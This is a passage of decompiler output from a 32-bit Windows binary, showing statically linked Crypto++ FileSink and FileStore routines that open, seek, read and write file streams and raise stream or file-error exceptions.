  _DWORD pExceptionObject[5]; // [esp+58h] [ebp-30h] BYREF
  _DWORD v26[4]; // [esp+6Ch] [ebp-1Ch] BYREF
  int v27; // [esp+84h] [ebp-4h]

  v26[3] = &v19;
  v26[1] = this;
  v7 = (int *)this[12];
  if ( !v7 )
    return 0;
  v8 = a3;
  if ( !*(_QWORD *)a3 && a4 == __PAIR64__(a3[1] | *a3, 1) )
  {
    v9 = sub_456900(v7);
    if ( v9 != -1 )
    {
      LOBYTE(a3) = v9;
      result = (*(int (__thiscall **)(int, int, _DWORD **, int, _DWORD, int))(*(_DWORD *)a2 + 140))(
                 a2,
                 a5,
                 &a3,
                 1,
                 0,
                 a6);
      *(_QWORD *)v8 += (unsigned int)(1 - result);
      return result;
    }
    return 0;
  }
  sub_456DB0(v7, (int)&v23);
  v11 = sub_456C10((_BYTE *)this[12], 0, 0, 2);
  sub_456DB0(v11, (int)&v20);
  v12 = (_BYTE *)this[12];
  v22 = (__int128)v23;
  *(_QWORD *)&v22 = *(_QWORD *)v8 + __PAIR64__(_mm_cvtsi128_si32(_mm_srli_si128(v23, 4)), _mm_cvtsi128_si32(v23));
  v26[2] = v23.m128i_i32[2] + v22;
  a3 = (_DWORD *)(v21 + v20);
  if ( v23.m128i_i64[1] + (__int64)v22 >= v21 + v20 )
  {
    sub_456A70(v12, *(_OWORD *)&v23, v24);
    return 0;
  }
  sub_456A70(v12, v22, v24);
  a4 -= *(_QWORD *)v8;
  v13 = *this;
  v27 = 0;
  result = (*(int (__thiscall **)(int *, int, __int64 *, int, int))(v13 + 128))(this, a2, &a4, a5, a6);
  v14 = __CFADD__((_DWORD)a4, *v8);
  *v8 += a4;
  v8[1] += HIDWORD(a4) + v14;
  if ( !result )
  {
    v15 = this[12];
    v27 = -1;
    v16 = 4;
    v17 = (_DWORD *)(v15 + *(_DWORD *)(*(_DWORD *)v15 + 4));
    if ( v17[14] )
      v16 = 0;
    v17[3] = v16;
    if ( (v16 & v17[4]) != 0 )
    {
      v18 = sub_402C50(v26, 1);
      sub_403590(pExceptionObject, "ios_base::badbit set", v18);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI5_AVfailure_ios_base_std__);
    }
    sub_456A70((_BYTE *)this[12], *(_OWORD *)&v23, v24);
    return 0;
  }
  *((_BYTE *)this + 60) = 0;
  return result;
}
// 455AD0: using guessed type _DWORD pExceptionObject[5];

//----- (00455D30) --------------------------------------------------------
char __thiscall sub_455D30(_DWORD *this, int a2, int a3)
{
  int *v4; // ecx
  char v6[40]; // [esp+8h] [ebp-78h] BYREF
  char pExceptionObject[40]; // [esp+30h] [ebp-50h] BYREF
  _DWORD v8[10]; // [esp+58h] [ebp-28h] BYREF

  v4 = (int *)this[4];
  if ( !v4 )
  {
    sub_419B80((int)v8, "FileSink: output stream not opened");
    v8[9] = 0;
    sub_4553B0(pExceptionObject, v8);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVErr_FileSink_CryptoPP__);
  }
  sub_4212B0(v4);
  if ( *(_DWORD *)(*(_DWORD *)(*(_DWORD *)this[4] + 4) + this[4] + 12) )
  {
    sub_455A00(v6);
    _CxxThrowException(v6, (_ThrowInfo *)&_TI4_AVWriteErr_FileSink_CryptoPP__);
  }
  return 0;
}

//----- (00455DE0) --------------------------------------------------------
int __thiscall sub_455DE0(_DWORD *this, int a2)
{
  _DWORD *v3; // edi
  unsigned __int8 (__thiscall *v4)(int, const char *, const wchar_t **, wchar_t **); // eax
  int result; // eax
  char v6; // al
  int v7; // edx
  _DWORD *v8; // eax
  _DWORD *v9; // edi
  int v10; // eax
  int v11; // eax
  int v12; // ecx
  wchar_t *v13; // ecx
  int v14; // esi
  _DWORD *v15; // eax
  _DWORD *v16; // ecx
  int v17; // eax
  int v18; // ecx
  int v19; // eax
  size_t *v20; // eax
  _DWORD *v21; // eax
  _DWORD *v22; // ecx
  int v23; // eax
  char *v24; // esi
  int *v25; // [esp-4h] [ebp-34h]
  int *v26; // [esp-4h] [ebp-34h]
  _DWORD v27[2]; // [esp+14h] [ebp-1Ch] BYREF
  int v28; // [esp+1Ch] [ebp-14h]
  char *v29; // [esp+20h] [ebp-10h] BYREF
  int v30; // [esp+2Ch] [ebp-4h]
  wchar_t *v31; // [esp+30h] [ebp+0h] BYREF
  unsigned __int8 v32; // [esp+37h] [ebp+7h] BYREF
  char v33[40]; // [esp+38h] [ebp+8h] BYREF
  char pExceptionObject[40]; // [esp+60h] [ebp+30h] BYREF
  size_t v35; // [esp+88h] [ebp+58h] BYREF
  _DWORD v36[5]; // [esp+8Ch] [ebp+5Ch] BYREF

  v3 = this + 4;
  this[4] = 0;
  this[3] = 0;
  v4 = *(unsigned __int8 (__thiscall **)(int, const char *, const wchar_t **, wchar_t **))(*(_DWORD *)a2 + 4);
  v29 = 0;
  v31 = 0;
  if ( !v4(a2, "OutputFileNameWide", &wchar_t const * `RTTI Type Descriptor', &v31)
    && !(*(unsigned __int8 (__thiscall **)(int, const char *, const char **, char **))(*(_DWORD *)a2 + 4))(
          a2,
          "OutputFileName",
          &char const * `RTTI Type Descriptor',
          &v29) )
  {
    return (*(int (__thiscall **)(int, const char *, void ***, _DWORD *))(*(_DWORD *)a2 + 4))(
             a2,
             "OutputStreamPointer",
             &std::ostream * `RTTI Type Descriptor',
             v3);
  }
  v6 = (*(int (__thiscall **)(int, const char *, bool *, unsigned __int8 *))(*(_DWORD *)a2 + 4))(
         a2,
         "OutputBinaryMode",
         &bool `RTTI Type Descriptor',
         &v32);
  v7 = 1;
  if ( v6 )
    v7 = v32;
  v28 = v7;
  v8 = operator new(0xB0u);
  v9 = v8;
  v27[1] = v8;
  v30 = 0;
  if ( v8 )
  {
    *v8 = &unk_4CF3F0;
    v8[26] = &std::ios::`vftable';
    v10 = *v8;
    LOBYTE(v30) = 1;
    *(_DWORD *)((char *)v9 + *(_DWORD *)(v10 + 4)) = &std::ostream::`vftable';
    *(_DWORD *)((char *)v9 + *(_DWORD *)(*v9 + 4) - 4) = *(_DWORD *)(*v9 + 4) - 8;
    sub_421410((int)v9 + *(_DWORD *)(*v9 + 4), (int)(v9 + 1), 0);
    v11 = *v9;
    v30 = 3;
    *(_DWORD *)((char *)v9 + *(_DWORD *)(v11 + 4)) = &std::ofstream::`vftable';
    *(_DWORD *)((char *)v9 + *(_DWORD *)(*v9 + 4) - 4) = *(_DWORD *)(*v9 + 4) - 104;
    sub_41FB20(v9 + 1, 0);
  }
  else
  {
    v9 = 0;
  }
  v12 = this[3];
  v30 = -1;
  if ( v12 )
    (**(void (__thiscall ***)(int, int))(*(_DWORD *)(*(_DWORD *)v12 + 4) + v12))(
      *(_DWORD *)(*(_DWORD *)v12 + 4) + v12,
      1);
  v13 = v31;
  result = 18;
  this[3] = v9;
  v14 = 4;
  if ( v13 )
  {
    if ( (_BYTE)v28 )
      result = 50;
    v15 = sub_41F920(v9 + 1, v13, result, 64);
    v16 = (_DWORD *)((char *)v9 + *(_DWORD *)(*v9 + 4));
    if ( v15 )
    {
      v19 = 4;
      if ( v16[14] )
        v19 = 0;
      v16[3] = v19;
      if ( (v19 & v16[4]) != 0 )
        goto LABEL_20;
    }
    else
    {
      v17 = (v16[3] | (4 * (v16[14] == 0) + 2)) & 0x17;
      v16[3] = v17;
      v18 = v17 & v16[4];
      if ( v18 )
      {
        if ( (v18 & 4) != 0 )
        {
          v24 = "ios_base::badbit set";
          goto LABEL_41;
        }
LABEL_39:
        v24 = "ios_base::failbit set";
        if ( (v18 & 2) == 0 )
          v24 = "ios_base::eofbit set";
        goto LABEL_41;
      }
    }
    v9 = (_DWORD *)this[3];
    if ( (*((_BYTE *)v9 + *(_DWORD *)(*v9 + 4) + 12) & 6) != 0 )
    {
      v20 = (size_t *)sub_45AC80((int)&v35, v31, 0);
      v30 = 4;
      sub_455540(pExceptionObject, v20);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVOpenErr_FileSink_CryptoPP__);
    }
    result = 18;
  }
  if ( v29 )
  {
    if ( (_BYTE)v28 )
      result = 50;
    v21 = sub_41FA20(v9 + 1, v29, result, 64);
    v22 = (_DWORD *)((char *)v9 + *(_DWORD *)(*v9 + 4));
    if ( !v21 )
    {
      v23 = (v22[3] | (4 * (v22[14] == 0) + 2)) & 0x17;
      v22[3] = v23;
      v18 = v23 & v22[4];
      if ( v18 )
      {
        if ( (v18 & 4) != 0 )
        {
          v24 = "ios_base::badbit set";
LABEL_41:
          v26 = sub_402C50(v27, 1);
          sub_403590(v36, v24, v26);
LABEL_42:
          _CxxThrowException(v36, (_ThrowInfo *)&_TI5_AVfailure_ios_base_std__);
        }
        goto LABEL_39;
      }
      goto LABEL_34;
    }
    if ( v22[14] )
      v14 = 0;
    v22[3] = v14;
    if ( (v14 & v22[4]) == 0 )
    {
LABEL_34:
      v9 = (_DWORD *)this[3];
      result = *(_DWORD *)(*v9 + 4);
      if ( (*((_BYTE *)v9 + result + 12) & 6) != 0 )
      {
        sub_419B80((int)&v35, v29);
        v30 = 5;
        sub_455540(v33, &v35);
        _CxxThrowException(v33, (_ThrowInfo *)&_TI4_AVOpenErr_FileSink_CryptoPP__);
      }
      goto LABEL_36;
    }
LABEL_20:
    v25 = sub_402C50(v27, 1);
    sub_403590(v36, "ios_base::badbit set", v25);
    goto LABEL_42;
  }
LABEL_36:
  this[4] = v9;
  return result;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 4B8574: using guessed type void *std::ios::`vftable';
// 4B857C: using guessed type void *std::ostream::`vftable';
// 4BBFB8: using guessed type void *std::ofstream::`vftable';
// 4E3098: using guessed type __TI_flags _TI4_AVOpenErr_FileSink_CryptoPP__;
// 4EAD6C: using guessed type void **std::ostream * `RTTI Type Descriptor';
// 4ED4E8: using guessed type const char *char const * `RTTI Type Descriptor';
// 4ED864: using guessed type bool bool `RTTI Type Descriptor';
// 4EE1C4: using guessed type const wchar_t *wchar_t const * `RTTI Type Descriptor';
// 455DE0: using guessed type wchar_t *var_74;
// 455DE0: using guessed type char var_6C[40];
// 455DE0: using guessed type _DWORD var_18[5];

//----- (00456140) --------------------------------------------------------
__int64 __thiscall sub_456140(_DWORD *this)
{
  _BYTE *v2; // ecx
  _BYTE *v4; // eax
  __int128 v5; // [esp+4h] [ebp-30h] BYREF
  __int64 v6; // [esp+14h] [ebp-20h]
  __int64 v7[3]; // [esp+1Ch] [ebp-18h] BYREF

  v2 = (_BYTE *)this[12];
  if ( !v2 )
    return 0i64;
  sub_456DB0(v2, (int)&v5);
  v4 = sub_456C10((_BYTE *)this[12], 0, 0, 2);
  sub_456DB0(v4, (int)v7);
  sub_456A70((_BYTE *)this[12], v5, v6);
  return v7[1] + v7[0] - *((_QWORD *)&v5 + 1) - v5;
}

//----- (004561C0) --------------------------------------------------------
int __thiscall sub_4561C0(int **this, int a2, unsigned int a3, int a4, int a5)
{
  int **v5; // edi
  int *v6; // ecx
  char v9[40]; // [esp+14h] [ebp-78h] BYREF
  char pExceptionObject[40]; // [esp+3Ch] [ebp-50h] BYREF
  _DWORD v11[10]; // [esp+64h] [ebp-28h] BYREF

  v5 = this;
  v6 = this[4];
  if ( !v6 )
  {
    sub_419B80((int)v11, "FileSink: output stream not opened");
    v11[9] = 0;
    sub_4553B0(pExceptionObject, v11);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVErr_FileSink_CryptoPP__);
  }
  if ( a3 )
  {
    sub_41C1D0(this[4], a2, a3);
    v5 = this;
    v6 = this[4];
  }
  if ( a4 )
  {
    sub_4212B0(v6);
    v6 = v5[4];
  }
  if ( *(int *)((char *)v6 + *(_DWORD *)(*v6 + 4) + 12) )
  {
    sub_455A00(v9);
    _CxxThrowException(v9, (_ThrowInfo *)&_TI4_AVWriteErr_FileSink_CryptoPP__);
  }
  return 0;
}

//----- (004562D0) --------------------------------------------------------
unsigned __int64 __thiscall sub_4562D0(_DWORD *this, __int64 a2)
{
  _BYTE *v3; // ecx
  _QWORD *v5; // eax
  unsigned __int64 v6; // kr00_8
  int v7; // ebx
  _QWORD *v8; // eax
  char v9[24]; // [esp+10h] [ebp-6Ch] BYREF
  unsigned int v10; // [esp+28h] [ebp-54h]
  char pExceptionObject[40]; // [esp+2Ch] [ebp-50h] BYREF
  _DWORD v12[10]; // [esp+54h] [ebp-28h] BYREF

  v3 = (_BYTE *)this[12];
  if ( !v3 )
    return 0i64;
  v5 = (_QWORD *)sub_456DB0(v3, (int)v12);
  v6 = *v5 + v5[1];
  v10 = HIDWORD(v6);
  v7 = v6;
  if ( (a2 != 0) != a2 > 0 )
  {
    sub_419B80((int)v12, "FileStore: maximum seek offset exceeded");
    v12[9] = 0;
    sub_405230(pExceptionObject, v12);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  sub_456C10((_BYTE *)this[12], a2, SHIDWORD(a2), 1);
  v8 = (_QWORD *)sub_456DB0((_BYTE *)this[12], (int)v9);
  return *v8 + v8[1] - __PAIR64__(v10, v6);
}
// 4562D0: using guessed type char var_6C[24];

//----- (004563D0) --------------------------------------------------------
_DWORD *__thiscall sub_4563D0(int this, int a2)
{
  int v3; // edi
  unsigned __int8 (__thiscall *v4)(int, const char *, const wchar_t **, wchar_t **); // eax
  _DWORD *result; // eax
  char v6; // al
  int v7; // edx
  _DWORD *v8; // edi
  int v9; // eax
  int v10; // eax
  int v11; // eax
  int v12; // ecx
  wchar_t *v13; // ecx
  int v14; // esi
  int v15; // eax
  _DWORD *v16; // eax
  _DWORD *v17; // ecx
  int v18; // eax
  int v19; // ecx
  int v20; // eax
  size_t *v21; // eax
  int v22; // eax
  _DWORD *v23; // eax
  _DWORD *v24; // ecx
  int v25; // eax
  char *v26; // esi
  int *v27; // [esp-4h] [ebp-34h]
  int *v28; // [esp-4h] [ebp-34h]
  _DWORD v29[2]; // [esp+14h] [ebp-1Ch] BYREF
  int v30; // [esp+1Ch] [ebp-14h]
  char *v31; // [esp+20h] [ebp-10h] BYREF
  int v32; // [esp+2Ch] [ebp-4h]
  wchar_t *v33; // [esp+30h] [ebp+0h] BYREF
  unsigned __int8 v34; // [esp+37h] [ebp+7h] BYREF
  char v35[40]; // [esp+38h] [ebp+8h] BYREF
  char pExceptionObject[40]; // [esp+60h] [ebp+30h] BYREF
  size_t v37; // [esp+88h] [ebp+58h] BYREF
  _DWORD v38[5]; // [esp+8Ch] [ebp+5Ch] BYREF

  v3 = this + 48;
  *(_DWORD *)(this + 48) = 0;
  *(_BYTE *)(this + 60) = 0;
  *(_DWORD *)(this + 44) = 0;
  v4 = *(unsigned __int8 (__thiscall **)(int, const char *, const wchar_t **, wchar_t **))(*(_DWORD *)a2 + 4);
  v31 = 0;
  v33 = 0;
  if ( !v4(a2, "InputFileNameWide", &wchar_t const * `RTTI Type Descriptor', &v33)
    && !(*(unsigned __int8 (__thiscall **)(int, const char *, const char **, char **))(*(_DWORD *)a2 + 4))(
          a2,
          "InputFileName",
          &char const * `RTTI Type Descriptor',
          &v31) )
  {
    return (_DWORD *)(*(int (__thiscall **)(int, const char *, void ***, int))(*(_DWORD *)a2 + 4))(
                       a2,
                       "InputStreamPointer",
                       &std::istream * `RTTI Type Descriptor',
                       v3);
  }
  v6 = (*(int (__thiscall **)(int, const char *, bool *, unsigned __int8 *))(*(_DWORD *)a2 + 4))(
         a2,
         "InputBinaryMode",
         &bool `RTTI Type Descriptor',
         &v34);
  v7 = 1;
  if ( v6 )
    v7 = v34;
  v30 = v7;
  result = operator new(0xB8u);
  v8 = result;
  v29[1] = result;
  v32 = 0;
  if ( result )
  {
    *result = &unk_4CF2AC;
    result[28] = &std::ios::`vftable';
    v9 = *result;
    LOBYTE(v32) = 1;
    *(_DWORD *)((char *)v8 + *(_DWORD *)(v9 + 4)) = &std::istream::`vftable';
    *(_DWORD *)((char *)v8 + *(_DWORD *)(*v8 + 4) - 4) = *(_DWORD *)(*v8 + 4) - 24;
    v10 = *v8;
    v8[2] = 0;
    v8[3] = 0;
    sub_421410((int)v8 + *(_DWORD *)(v10 + 4), (int)(v8 + 4), 0);
    v11 = *v8;
    v32 = 3;
    *(_DWORD *)((char *)v8 + *(_DWORD *)(v11 + 4)) = &std::ifstream::`vftable';
    *(_DWORD *)((char *)v8 + *(_DWORD *)(*v8 + 4) - 4) = *(_DWORD *)(*v8 + 4) - 112;
    result = sub_41FB20(v8 + 4, 0);
  }
  else
  {
    v8 = 0;
  }
  v12 = *(_DWORD *)(this + 44);
  v32 = -1;
  if ( v12 )
    result = (_DWORD *)(**(int (__thiscall ***)(int, int))(*(_DWORD *)(*(_DWORD *)v12 + 4) + v12))(
                         *(_DWORD *)(*(_DWORD *)v12 + 4) + v12,
                         1);
  v13 = v33;
  *(_DWORD *)(this + 44) = v8;
  v14 = 4;
  if ( v13 )
  {
    v15 = 1;
    if ( (_BYTE)v30 )
      v15 = 33;
    v16 = sub_41F920(v8 + 4, v13, v15, 64);
    v17 = (_DWORD *)((char *)v8 + *(_DWORD *)(*v8 + 4));
    if ( v16 )
    {
      v20 = 4;
      if ( v17[14] )
        v20 = 0;
      v17[3] = v20;
      if ( (v20 & v17[4]) != 0 )
        goto LABEL_20;
    }
    else
    {
      v18 = (v17[3] | (4 * (v17[14] == 0) + 2)) & 0x17;
      v17[3] = v18;
      v19 = v18 & v17[4];
      if ( v19 )
      {
        if ( (v19 & 4) != 0 )
        {
          v26 = "ios_base::badbit set";
          goto LABEL_40;
        }
LABEL_38:
        v26 = "ios_base::failbit set";
        if ( (v19 & 2) == 0 )
          v26 = "ios_base::eofbit set";
        goto LABEL_40;
      }
    }
    v8 = *(_DWORD **)(this + 44);
    result = *(_DWORD **)(*v8 + 4);
    if ( (*((_BYTE *)v8 + (_DWORD)result + 12) & 6) != 0 )
    {
      v21 = (size_t *)sub_45AC80((int)&v37, v33, 0);
      v32 = 4;
      sub_4556F0(pExceptionObject, v21);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVOpenErr_FileStore_CryptoPP__);
    }
  }
  if ( v31 )
  {
    v22 = 1;
    if ( (_BYTE)v30 )
      v22 = 33;
    v23 = sub_41FA20(v8 + 4, v31, v22, 64);
    v24 = (_DWORD *)((char *)v8 + *(_DWORD *)(*v8 + 4));
    if ( !v23 )
    {
      v25 = (v24[3] | (4 * (v24[14] == 0) + 2)) & 0x17;
      v24[3] = v25;
      v19 = v25 & v24[4];
      if ( v19 )
      {
        if ( (v19 & 4) != 0 )
        {
          v26 = "ios_base::badbit set";
LABEL_40:
          v28 = sub_402C50(v29, 1);
          sub_403590(v38, v26, v28);
LABEL_41:
          _CxxThrowException(v38, (_ThrowInfo *)&_TI5_AVfailure_ios_base_std__);
        }
        goto LABEL_38;
      }
      goto LABEL_33;
    }
    if ( v24[14] )
      v14 = 0;
    v24[3] = v14;
    if ( (v14 & v24[4]) == 0 )
    {
LABEL_33:
      v8 = *(_DWORD **)(this + 44);
      result = *(_DWORD **)(*v8 + 4);
      if ( (*((_BYTE *)v8 + (_DWORD)result + 12) & 6) != 0 )
      {
        sub_419B80((int)&v37, v31);
        v32 = 5;
        sub_4556F0(v35, &v37);
        _CxxThrowException(v35, (_ThrowInfo *)&_TI4_AVOpenErr_FileStore_CryptoPP__);
      }
      goto LABEL_35;
    }
LABEL_20:
    v27 = sub_402C50(v29, 1);
    sub_403590(v38, "ios_base::badbit set", v27);
    goto LABEL_41;
  }
LABEL_35:
  *(_DWORD *)(this + 48) = v8;
  return result;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 4B8574: using guessed type void *std::ios::`vftable';
// 4B8640: using guessed type void *std::istream::`vftable';
// 4BBF88: using guessed type void *std::ifstream::`vftable';
// 4E2FFC: using guessed type __TI_flags _TI4_AVOpenErr_FileStore_CryptoPP__;
// 4EAD30: using guessed type void **std::istream * `RTTI Type Descriptor';
// 4ED4E8: using guessed type const char *char const * `RTTI Type Descriptor';
// 4ED864: using guessed type bool bool `RTTI Type Descriptor';
// 4EE1C4: using guessed type const wchar_t *wchar_t const * `RTTI Type Descriptor';
// 4563D0: using guessed type wchar_t *var_74;
// 4563D0: using guessed type _DWORD var_18[5];

//----- (00456750) --------------------------------------------------------
int __thiscall sub_456750(int this, int a2, _DWORD *a3, int a4, int a5)
{
  int v5; // edx
  _QWORD *v6; // ebp
  int v8; // ecx
  int result; // eax
  unsigned int v10; // ebx
  unsigned int v11; // edi
  int v12; // ecx
  unsigned int v13; // eax
  int v14; // eax
  unsigned int v15; // eax
  int v16; // ecx
  int v17; // eax
  int v18; // [esp+1Ch] [ebp-3Ch] BYREF
  int v19; // [esp+20h] [ebp-38h]
  int v20; // [esp+24h] [ebp-34h]
  _QWORD *v21; // [esp+28h] [ebp-30h]
  char pExceptionObject[40]; // [esp+2Ch] [ebp-2Ch] BYREF

  v5 = a2;
  v6 = a3;
  v19 = a2;
  v8 = a4;
  v21 = a3;
  v20 = a4;
  if ( !*(_DWORD *)(this + 48) )
  {
    *a3 = 0;
    result = 0;
    a3[1] = 0;
    return result;
  }
  v10 = a3[1];
  v11 = *a3;
  *a3 = 0;
  a3[1] = 0;
  if ( !*(_BYTE *)(this + 60) )
    goto LABEL_6;
  while ( 1 )
  {
    v12 = (*(int (__thiscall **)(int, int, _DWORD, _DWORD, _DWORD, int))(*(_DWORD *)v5 + 144))(
            v5,
            v8,
            *(_DWORD *)(this + 52),
            *(_DWORD *)(this + 56),
            0,
            a5);
    *(_BYTE *)(this + 60) = v12 != 0;
    if ( v12 )
      return v12;
    v13 = *(_DWORD *)(this + 56);
    v5 = v19;
    v10 = (__PAIR64__(v10, v11) - v13) >> 32;
    v11 -= v13;
    *v6 += v13;
LABEL_6:
    if ( !(v10 | v11) || *(_DWORD *)(*(_DWORD *)(**(_DWORD **)(this + 48) + 4) + *(_DWORD *)(this + 48) + 12) )
      break;
    if ( v10 || v11 == -1 )
      v14 = -1;
    else
      v14 = v11;
    v18 = v14;
    v15 = *(_DWORD *)(this + 32);
    if ( !v15 )
    {
      v16 = (*(int (__thiscall **)(int, int, int *))(*(_DWORD *)v5 + 136))(v5, v20, &v18);
      v15 = v18;
      if ( v18 )
        goto LABEL_16;
      sub_418EE0((_DWORD *)(this + 24), 0x400u);
      v15 = *(_DWORD *)(this + 32);
    }
    v16 = *(_DWORD *)(this + 36);
LABEL_16:
    *(_DWORD *)(this + 52) = v16;
    if ( !v10 && v15 >= v11 )
      v15 = v11;
    sub_44E6A0(*(_DWORD *)(this + 48), v16, v15);
    v6 = v21;
    v5 = v19;
    v8 = v20;
    *(_DWORD *)(this + 56) = *(_DWORD *)(*(_DWORD *)(this + 48) + 8);
  }
  v17 = *(_DWORD *)(*(_DWORD *)(**(_DWORD **)(this + 48) + 4) + *(_DWORD *)(this + 48) + 12);
  if ( v17 && (v17 & 1) == 0 )
  {
    sub_4558A0(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVReadErr_FileStore_CryptoPP__);
  }
  return 0;
}

//----- (00456900) --------------------------------------------------------
int __thiscall sub_456900(int *this)
{
  bool v2; // bl
  int v3; // eax
  int v4; // ecx
  int v5; // edi
  int v6; // eax
  _DWORD **v7; // ecx
  unsigned __int8 *v8; // edx
  int v9; // edx
  int v10; // eax
  _DWORD *v11; // edx
  char v12; // al
  char v13; // cl
  int v14; // eax
  int v15; // ecx
  int v16; // eax
  int v17; // eax
  int v18; // ecx
  char *v20; // esi
  int *v21; // eax
  int v22; // [esp+0h] [ebp-4Ch] BYREF
  _DWORD pExceptionObject[6]; // [esp+10h] [ebp-3Ch] BYREF
  char v24; // [esp+28h] [ebp-24h]
  _DWORD v25[5]; // [esp+2Ch] [ebp-20h] BYREF
  int v26; // [esp+48h] [ebp-4h]

  v25[4] = &v22;
  v25[3] = this;
  v2 = 0;
  pExceptionObject[5] = this;
  this[2] = 0;
  this[3] = 0;
  v3 = *this;
  v25[2] = 0;
  v4 = *(int *)((char *)this + *(_DWORD *)(v3 + 4) + 56);
  if ( v4 )
    (*(void (__thiscall **)(int))(*(_DWORD *)v4 + 4))(v4);
  v26 = 0;
  v24 = sub_427AC0(this, 1);
  v26 = 1;
  if ( v24 )
  {
    v6 = *this;
    LOBYTE(v26) = 2;
    v7 = *(_DWORD ***)((char *)this + *(_DWORD *)(v6 + 4) + 56);
    v8 = (unsigned __int8 *)*v7[7];
    if ( v8 && (int)*v7[11] > 0 )
    {
      v5 = *v8;
      v2 = v5 == -1;
    }
    else
    {
      v5 = ((int (__thiscall *)(_DWORD **))(*v7)[6])(v7);
      v2 = v5 == -1;
    }
    v26 = 1;
  }
  else
  {
    v5 = -1;
  }
  v9 = *(_DWORD *)(*this + 4);
  v10 = *(int *)((char *)this + v9 + 12);
  v11 = (int *)((char *)this + v9);
  v12 = v2 | v10;
  v13 = v12 | 4;
  if ( v11[14] )
    v13 = v12;
  v14 = v11[4];
  v15 = v13 & 0x17;
  v11[3] = v15;
  v16 = v15 & v14;
  if ( v16 )
  {
    if ( (v16 & 4) != 0 )
    {
      v20 = "ios_base::badbit set";
    }
    else
    {
      v20 = "ios_base::failbit set";
      if ( (v16 & 2) == 0 )
        v20 = "ios_base::eofbit set";
    }
    v21 = sub_402C50(v25, 1);
    sub_403590(pExceptionObject, v20, v21);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI5_AVfailure_ios_base_std__);
  }
  v17 = *this;
  v26 = 4;
  v18 = *(int *)((char *)this + *(_DWORD *)(v17 + 4) + 56);
  if ( v18 )
    (*(void (__thiscall **)(int))(*(_DWORD *)v18 + 8))(v18);
  return v5;
}

//----- (00456A70) --------------------------------------------------------
_BYTE *__thiscall sub_456A70(_BYTE *this, __int128 a2, __int64 a3)
{
  int v4; // esi
  int v5; // eax
  _DWORD *v6; // esi
  char v7; // al
  char v8; // dl
  int v9; // eax
  int v10; // edx
  int v11; // eax
  int v12; // eax
  int v13; // ecx
  int v14; // eax
  int v15; // eax
  _DWORD *v16; // ecx
  int v17; // eax
  int v18; // ecx
  int v19; // eax
  int v20; // ecx
  char *v22; // esi
  int *v23; // eax
  char *v24; // esi
  int *v25; // eax
  __int64 v26; // [esp+Ch] [ebp-48h] BYREF
  __int64 v27; // [esp+14h] [ebp-40h]
  _DWORD pExceptionObject[5]; // [esp+24h] [ebp-30h] BYREF
  int v29; // [esp+38h] [ebp-1Ch] BYREF
  _BYTE *v30; // [esp+40h] [ebp-14h] BYREF
  char v31; // [esp+44h] [ebp-10h]
  int v32; // [esp+50h] [ebp-4h]

  v4 = *(_DWORD *)(*(_DWORD *)this + 4);
  v5 = *(_DWORD *)&this[v4 + 12];
  v6 = &this[v4];
  v7 = v5 & 0xFE;
  v8 = v7 | 4;
  if ( v6[14] )
    v8 = v7;
  v9 = v6[4];
  v10 = v8 & 0x17;
  v6[3] = v10;
  v11 = v10 & v9;
  if ( v11 )
  {
    if ( (v11 & 4) != 0 )
    {
      v22 = "ios_base::badbit set";
    }
    else
    {
      v22 = "ios_base::failbit set";
      if ( (v11 & 2) == 0 )
        v22 = "ios_base::eofbit set";
    }
    v23 = sub_402C50(&v30, 1);
    sub_403590(pExceptionObject, v22, v23);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI5_AVfailure_ios_base_std__);
  }
  v12 = *(_DWORD *)this;
  v30 = this;
  v13 = *(_DWORD *)&this[*(_DWORD *)(v12 + 4) + 56];
  if ( v13 )
    (*(void (__thiscall **)(int))(*(_DWORD *)v13 + 4))(v13);
  v32 = 0;
  v31 = sub_427AC0(this, 1);
  v14 = *(_DWORD *)this;
  v32 = 1;
  v15 = *(_DWORD *)(v14 + 4);
  if ( (this[v15 + 12] & 6) == 0 )
  {
    (*(void (__thiscall **)(_DWORD, __int64 *, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, int))(**(_DWORD **)&this[v15 + 56] + 44))(
      *(_DWORD *)&this[v15 + 56],
      &v26,
      a2,
      DWORD1(a2),
      DWORD2(a2),
      HIDWORD(a2),
      a3,
      HIDWORD(a3),
      1);
    if ( (((unsigned __int64)(v27 + v26) >> 32) & (unsigned int)(v27 + v26)) == -1 )
    {
      v16 = &this[*(_DWORD *)(*(_DWORD *)this + 4)];
      v17 = (v16[3] | (4 * (v16[14] == 0) + 2)) & 0x17;
      v16[3] = v17;
      v18 = v17 & v16[4];
      if ( v18 )
      {
        if ( (v18 & 4) != 0 )
        {
          v24 = "ios_base::badbit set";
        }
        else
        {
          v24 = "ios_base::failbit set";
          if ( (v18 & 2) == 0 )
            v24 = "ios_base::eofbit set";
        }
        v25 = sub_402C50(&v29, 1);
        sub_403590((_DWORD *)&v26 + 1, v24, v25);
        _CxxThrowException((char *)&v26 + 4, (_ThrowInfo *)&_TI5_AVfailure_ios_base_std__);
      }
    }
  }
  v19 = *(_DWORD *)this;
  v32 = 2;
  v20 = *(_DWORD *)&this[*(_DWORD *)(v19 + 4) + 56];
  if ( v20 )
    (*(void (__thiscall **)(int))(*(_DWORD *)v20 + 8))(v20);
  return this;
}
// 456A70: using guessed type _DWORD pExceptionObject[5];

//----- (00456C10) --------------------------------------------------------
_BYTE *__thiscall sub_456C10(_BYTE *this, int a2, int a3, int a4)
{
  int v5; // esi
  int v6; // eax
  _DWORD *v7; // esi
  char v8; // al
  char v9; // dl
  int v10; // eax
  int v11; // edx
  int v12; // eax
  int v13; // eax
  int v14; // ecx
  int v15; // eax
  int v16; // eax
  _DWORD *v17; // ecx
  int v18; // eax
  int v19; // ecx
  int v20; // eax
  int v21; // ecx
  char *v23; // esi
  int *v24; // eax
  char *v25; // esi
  int *v26; // eax
  __int64 v27; // [esp+Ch] [ebp-48h] BYREF
